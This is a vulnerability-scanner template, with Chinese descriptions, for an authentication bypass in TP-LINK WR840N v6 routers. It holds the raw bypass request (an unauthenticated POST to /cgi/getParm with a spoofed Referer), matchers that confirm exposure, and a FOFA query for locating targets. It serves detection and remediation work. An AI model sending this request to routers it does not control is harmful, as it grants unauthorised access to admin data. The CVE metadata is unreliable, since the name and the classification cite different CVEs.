id: tp-link-wr840n-auth-bypass

info:
  name: TP-LINK WR840N v6 up to 0.9.1 4.16 - 漏洞（CVE-2024-57050）
  author: DhiyaneshDK
  severity: critical
  description: |
    该模板用于检测 TP-LINK WR840N v6 up to 0.9.1 4.16 - 漏洞。该类漏洞通常源于认证、授权或会话校验逻辑不完整，使未授权用户可访问受保护接口或执行敏感操作。模板会向 `/cgi/getParm` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可绕过登录或权限限制，访问管理功能、敏感数据或业务操作接口。
    - 在管理接口暴露的场景下，可能进一步导致配置被篡改、账号被接管或系统被植入后门。
  remediation: |
    - 在服务端统一执行认证和授权校验，避免仅依赖前端控制或可预测参数。
    - 修复存在绕过问题的版本，并限制管理接口、调试接口和敏感 API 的访问来源。
    - 审计异常登录、权限变更和配置修改记录，轮换可能受影响的账号凭据。
  reference:
    - https://github.com/Shuanunio/CVE_Requests/blob/main/TP-Link/WR840N%20v6/ACL%20bypass%20Vulnerability%20in%20TP-Link%20TL-WR840N.md
    - https://www.exploit-db.com/exploits/44781/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-11714
    cwe-id: CWE-287
    epss-score: 0.35365
    epss-percentile: 0.98312
    cpe: cpe:2.3:o:tp-link:tl-wr840n_firmware:0.9.1_3.16:*:*:*:*:*:*:*,cpe:2.3:h:tp-link:tl-wr840n:5.0:*:*:*:*:*:*:*,cpe:2.3:o:tp-link:tl-wr841n_firmware:0.9.1_4.16:*:*:*:*:*:*:*,cpe:2.3:h:tp-link:tl-wr841n:13.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="WR840N"
  tags: tp-link,auth-bypass,vuln

http:
  - raw:
      - |
        POST /cgi/getParm HTTP/1.1
        Host: {{Hostname}}
        Referer: http://tplinkwifi.net

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "$.ret=0;"
          - "var "
        condition: and

      - type: word
        part: content_type
        words:
          - "application/javascript"

      - type: status
        status:
          - 200
